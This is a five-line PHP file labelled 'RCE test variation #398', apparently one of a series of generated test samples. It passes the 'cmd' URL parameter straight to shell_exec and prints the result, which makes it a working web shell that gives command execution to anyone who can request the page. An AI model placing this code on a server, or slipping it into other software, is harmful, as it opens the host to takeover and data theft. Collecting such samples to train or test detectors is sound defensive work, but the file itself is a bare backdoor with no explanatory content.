<?php
// RCE test variation #398
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>